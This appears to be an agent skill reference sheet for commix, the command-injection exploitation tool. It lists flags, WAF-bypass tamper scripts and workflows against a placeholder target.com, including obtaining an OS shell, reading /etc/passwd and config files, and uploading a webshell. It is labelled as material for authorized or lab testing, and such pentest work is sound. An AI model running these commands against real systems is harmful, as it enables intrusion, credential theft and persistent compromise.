---
name: commix
description: "Auth/lab ref: automated OS command injection detection and exploitation tool. For testing web parameters, cookies, or headers for command injection vulnerabilities and escalating to an interactive OS shell."
license: GPL-3.0
compatibility: "Linux / macOS / Windows; Python 3; Pre-installed on Kali."
metadata:
  author: AeonDave
  version: "1.1"
---

# commix

Automated OS command injection detection and exploitation.

## Quick Start

```bash
# GET parameter
commix --url="http://target.com/ping?ip=127.0.0.1"

# POST parameter
commix --url="http://target.com/ping" --data="ip=127.0.0.1"

# From Burp request
commix -r request.txt

# Mark injection point explicitly with *
commix --url="http://target.com/page?ip=*"

# Direct OS shell
commix --url="http://target.com/?ip=1" --os-shell
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `--url <url>` | Target URL (`*` marks injection point) |
| `--data <data>` | POST body (`*` marks injection point) |
| `-r <file>` | Burp-format raw request file |
| `--cookie <c>` | Cookie string |
| `--headers <h>` | Custom HTTP headers |
| `--user-agent <ua>` | Custom User-Agent |
| `--referer <url>` | Custom Referer |
| `--param <p>` | Test specific parameter only |
| `--level <1-3>` | Test depth/thoroughness (default: 1) |
| `--technique <t>` | Force technique: `classic` / `timebased` / `file-based` / `semi-blind` |
| `--os-cmd <cmd>` | Execute single OS command |
| `--os-shell` | Interactive pseudo-shell after exploitation |
| `--file-read <path>` | Read file from target server |
| `--file-write <local>` | Write local file to server |
| `--file-dest <path>` | Destination path for file write |
| `--upload-file <file>` | Upload file via command injection |
| `--tamper <script>` | Tamper script for WAF bypass (comma-separated) |
| `--base64` | Base64-encode payloads |
| `--hex` | Hex-encode payloads |
| `--random-agent` | Random User-Agent |
| `--tor` | Route through Tor |
| `--proxy <url>` | HTTP/HTTPS proxy |
| `--batch` | Non-interactive, auto-accept defaults |
| `--output-dir <dir>` | Custom output directory |

## Injection Techniques

| Code | Technique | When to Use |
|------|-----------|-------------|
| `classic` | Output visible in response | Default — fastest when output reflected |
| `timebased` | Response delay reveals success | Blind injection, no output visible |
| `file-based` | Output written to accessible file | Semi-blind with web-writable dir |
| `semi-blind` | Alternative retrieval method | Middle-ground cases |

```bash
# Force time-based (blind)
commix --url="http://target.com/ping?ip=1" --technique=timebased

# Force classic (results-based)
commix --url="http://target.com/ping?ip=1" --technique=classic
```

## WAF Bypass (Tamper Scripts)

```bash
# Common tampers
commix --url="http://target.com/?ip=1" --tamper=space2ifs
commix --url="http://target.com/?ip=1" --tamper=base64encode
commix --url="http://target.com/?ip=1" --tamper=hexencode

# Stack multiple
commix --url="http://target.com/?ip=1" \
    --tamper=space2ifs,randomcase,backslashes
```

| Tamper | Effect |
|--------|--------|
| `space2ifs` | Replace spaces with `$IFS` |
| `base64encode` | Base64-encode payload |
| `hexencode` | Hex-encode payload |
| `randomcase` | Randomize keyword case |
| `backslashes` | Add backslash escaping |
| `caret` | Add caret characters (`c^at`) |
| `dollaratsigns` | Use `$@` syntax |
| `nested` | Nest commands in payload |
| `xforwardedfor` | Spoof `X-Forwarded-For` |
| `uninitializedvariable` | Use `$u` uninitialized vars |
| `slash2env` | Replace `/` with `${PATH:0:1}` |
| `sleep2usleep` | Replace `sleep` with `usleep` |
| `printf2echo` | Replace `printf` with `echo` |

## Common Workflows

```bash
# Test all techniques (level 3 = headers/referer/cookies)
commix -r request.txt --level=3 --batch

# Confirm injection then get shell
commix --url="http://target.com/api?cmd=ls" --os-cmd="id"
commix --url="http://target.com/api?cmd=ls" --os-shell

# Read sensitive files
commix --url="http://target.com/?ip=1" --file-read=/etc/passwd
commix --url="http://target.com/?ip=1" --file-read=/var/www/html/config.php

# Upload webshell
commix --url="http://target.com/?ip=1" \
    --file-write=./shell.php \
    --file-dest=/var/www/html/shell.php

# Cookie injection (test session parameter)
commix --url="http://target.com/profile" \
    --cookie="user=admin; debug=*" \
    --level=2

# Through Burp proxy
commix -r request.txt --proxy=http://127.0.0.1:8080 --batch

# WAF bypass with encoding
commix --url="http://target.com/?ip=1" \
    --tamper=space2ifs,base64encode \
    --technique=timebased --batch
```

## Injection Point Marking

```
URL:     http://target.com/page.php?cmd=*
POST:    cmd=*&other=value
Cookie:  session=abc; debug=*
Header:  X-Custom: *
```

## Resources

| File | When to load |
|------|--------------|
| `references/techniques.md` | Blind injection patterns, shell escalation, file upload via cmdi, reverse shell one-liners |
